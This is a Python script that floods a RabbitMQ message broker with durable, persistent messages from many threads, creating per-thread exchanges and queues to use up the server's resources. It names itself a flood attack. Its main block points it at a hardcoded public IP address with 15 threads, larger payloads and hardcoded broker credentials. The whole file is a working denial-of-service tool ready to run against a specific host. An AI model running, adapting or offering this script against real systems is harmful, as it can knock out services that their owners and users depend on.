import pika
import json
import time
import random
import threading
import logging
import queue
import signal
import psutil
import backoff
from datetime import datetime, UTC
from typing import Dict, List, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(threadName)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('flood_attack.log')
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class PublisherStats:
    """Statistics for message publishing"""
    start_time: float
    total_messages: int = 0
    total_errors: int = 0
    is_running: bool = True

    def get_rate(self) -> float:
        """Calculate messages per second"""
        elapsed = time.time() - self.start_time
        return self.total_messages / elapsed if elapsed > 0 else 0

class FloodPublisher:
    def __init__(self, host: str = 'localhost', threads: int = 5, message_size: int = 1000):
        self.host = host
        self.num_threads = threads
        self.message_size = message_size
        self.stats = PublisherStats(start_time=time.time())
        self.shutdown_event = threading.Event()
        self.batch_size = 100  # Number of messages to batch
        self.memory_threshold = 85  # Memory threshold percentage
        
        # Multiple exchange types for varied attack
        self.exchange_types = ['direct', 'fanout', 'topic']
        
        # Connection parameters with improved resilience
        self.connection_params = pika.ConnectionParameters(
            host=self.host,
            port=5672,
            credentials=pika.PlainCredentials('myapp', 'mypassword'),
            heartbeat=600,
            blocked_connection_timeout=300,
            connection_attempts=5,
            retry_delay=2,
            socket_timeout=5.0
        )

    @backoff.on_exception(
        backoff.expo,
        (pika.exceptions.AMQPConnectionError, pika.exceptions.AMQPChannelError),
        max_tries=5
    )
    def create_connection(self) -> pika.BlockingConnection:
        """Create connection with exponential backoff retry"""
        return pika.BlockingConnection(self.connection_params)

    def check_memory_usage(self) -> bool:
        """Monitor memory usage and return True if threshold exceeded"""
        memory_percent = psutil.Process().memory_percent()
        return memory_percent > self.memory_threshold

    def generate_batch_messages(self, size: int) -> List[Dict]:
        """Generate a batch of messages"""
        return [self.generate_message() for _ in range(size)]

    def generate_message(self) -> Dict:
        """Generate a message with random payload"""
        return {
            'id': f'MSG_{random.randint(1, 1000000)}',
            'timestamp': datetime.now(UTC).isoformat(),
            'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=self.message_size)),
            'payload': [random.random() for _ in range(100)]
        }

    def flood_messages(self, thread_id: int) -> None:
        """Enhanced message flooding with batching and multiple exchange types"""
        connection = None
        channel = None
        local_count = 0
        
        try:
            connection = self.create_connection()
            channel = connection.channel()
            
            # Declare multiple exchanges
            exchanges = []
            for ex_type in self.exchange_types:
                exchange_name = f'flood_exchange_{thread_id}_{ex_type}'
                channel.exchange_declare(
                    exchange=exchange_name,
                    exchange_type=ex_type,
                    durable=True
                )
                exchanges.append(exchange_name)

            queue_name = f'flood_queue_{thread_id}'
            channel.queue_declare(queue=queue_name, durable=True)
            
            # Bind queue to all exchanges
            for exchange in exchanges:
                channel.queue_bind(
                    queue=queue_name,
                    exchange=exchange,
                    routing_key='#'
                )

            while not self.shutdown_event.is_set():
                try:
                    # Check memory usage and throttle if needed
                    if self.check_memory_usage():
                        time.sleep(1)
                        continue

                    # Generate and send message batch
                    messages = self.generate_batch_messages(self.batch_size)
                    
                    # Alternate between exchanges for varied attack
                    exchange = random.choice(exchanges)
                    
                    # Use transaction for batch reliability
                    channel.tx_select()
                    
                    for message in messages:
                        channel.basic_publish(
                            exchange=exchange,
                            routing_key='#',
                            body=json.dumps(message),
                            properties=pika.BasicProperties(
                                delivery_mode=2,
                                timestamp=int(time.time()),
                                content_type='application/json'
                            )
                        )
                        local_count += 1
                        self.stats.total_messages += 1

                    channel.tx_commit()

                    if local_count % (self.batch_size * 10) == 0:
                        logger.debug(f"Thread {thread_id} sent {local_count} messages")

                except Exception as e:
                    channel.tx_rollback()
                    self.stats.total_errors += 1
                    logger.error(f"Publishing error in thread {thread_id}: {e}")
                    # Reconnect on error
                    if not connection.is_open:
                        connection = self.create_connection()
                        channel = connection.channel()

        except Exception as e:
            logger.error(f"Thread {thread_id} critical error: {e}")
        finally:
            if channel:
                try:
                    channel.close()
                except:
                    pass
            if connection:
                try:
                    connection.close()
                except:
                    pass

    def print_stats(self) -> None:
        """Print current statistics"""
        while self.stats.is_running:
            time.sleep(1)
            logger.info(
                f"Messages: {self.stats.total_messages:,} | "
                f"Rate: {self.stats.get_rate():.2f} msg/s | "
                f"Errors: {self.stats.total_errors}"
            )

    def signal_handler(self, signum, frame) -> None:
        """Handle shutdown signals"""
        logger.info("Shutdown signal received")
        self.stats.is_running = False
        self.shutdown_event.set()

    def start_attack(self) -> None:
        """Start multiple threads to flood the server"""
        logger.info(f"Starting flood attack with {self.num_threads} threads to {self.host}")
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        # Start stats monitoring thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()

        # Start publisher threads using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [
                executor.submit(self.flood_messages, i)
                for i in range(self.num_threads)
            ]

            # Wait for all threads to complete or for shutdown
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Thread error: {e}")

        logger.info("Attack stopped")
        logger.info(f"Final statistics: Messages={self.stats.total_messages:,}, "
                   f"Errors={self.stats.total_errors}")

if __name__ == "__main__":
    flooder = FloodPublisher(
        host='64.227.154.108',
        threads=15,  # Increased thread count
        message_size=2000  # Increased message size
    )
    flooder.start_attack()
